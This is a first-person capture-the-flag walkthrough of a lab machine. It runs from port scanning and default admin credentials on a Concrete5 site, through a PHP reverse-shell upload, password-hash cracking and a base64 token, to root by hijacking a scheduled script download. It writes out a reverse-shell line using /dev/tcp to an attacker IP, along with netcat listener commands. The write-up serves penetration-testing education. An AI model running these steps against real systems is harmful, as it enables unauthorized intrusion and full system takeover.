I started with an IP address of the target machine. My first step was to find out which ports were open and what services were running. I launched a scan with nmap using the -sC -sV flags to collect as much info as possible. The result showed that only one port was open—port 85, which was running Apache httpd 2.4.7 (Ubuntu). The HTTP title revealed a cheeky message: "OH N0! PWN3D 4G4IN", clearly a hint of a vulnerable machine.

I opened http://10.10.80.222:85 in the browser and saw a static page with a spooky image. That was my first clue that something might be hidden. I ran a directory brute-force using gobuster with a basic dirbuster wordlist. Eventually, I found an interesting path: /app.

At /app, there was another page with a "JUMP" button redirecting me to /app/castle — a blog-style site themed around the character Toad. Viewing the source code revealed that the site was running Concrete5 CMS version 8.5.2.

After searching for public exploits and finding nothing useful, I decided to try some default credentials on the login form. Surprisingly, the combination admin:password worked, and I gained access to the admin panel.

I immediately checked the file upload functionality. At first, only .txt and .xml files were allowed. I tested uploading different extensions using ffuf, but the real breakthrough was finding a setting that let me change the allowed file types. I added .php, generated a reverse shell using revshells.com, pointing it to my IP and port, and uploaded it.

I opened a listener in my terminal with nc -nvlp 9001. Then I navigated to the uploaded PHP file in the browser, and boom—I got a shell back to my machine!

After stabilizing the shell, I ran whoami and confirmed I was the www-data user. I looked into the /home directory and found two users: mario and toad. To go further, I needed their credentials.

I uploaded the LinEnum script to the server via /tmp using a Python HTTP server (python3 -m http.server) and downloaded it with wget on the target. Running LinEnum revealed that I could log in to MySQL as root with no password.

Inside the mKingdom database, I found the admin password hash — which turned out to just be password again. In the mysql database, I found a hash for the user toad. I cracked it using hashcat with mode 300 (MySQL) and rockyou.txt. It gave me the password, and I used su toad to switch users.

Still stuck, I ran LinEnum again—this time as toad. I discovered an environment variable in a .env file: PWD_TOKEN. It was base64 encoded. Once decoded, I got a new password, which worked for user mario. As mario, I could finally access user.txt and grab the first flag!

But I still needed root. After trying various approaches, I uploaded pspy64 to watch running processes. I noticed that every minute, a script named counter.sh was downloaded from a domain mkingdom.thm. That was my chance!

I edited /etc/hosts to point mkingdom.thm to my own IP. I hosted a fake counter.sh using Python's HTTP server on port 85. The script contained a simple reverse shell like sh -i >& /dev/tcp/10.10.202.107/9001 0>&1. I opened a listener with nc -nvlp 9001 and waited. One minute later—I got a shell. This time, as root.

I confirmed it with whoami, then navigated to /root and read the root.txt flag — mission complete.

Conclusion
This was a super fun and educational project. I went through the full chain: from enumeration and bypassing restrictions to privilege escalation and full system compromise. Some of the key takeaways:

Bypassing file upload restrictions via admin settings.

Harvesting and cracking password hashes using MySQL and hashcat.

Using environment variables to pivot to other users.

Watching background processes with pspy64 and exploiting scheduled tasks via DNS spoofing.
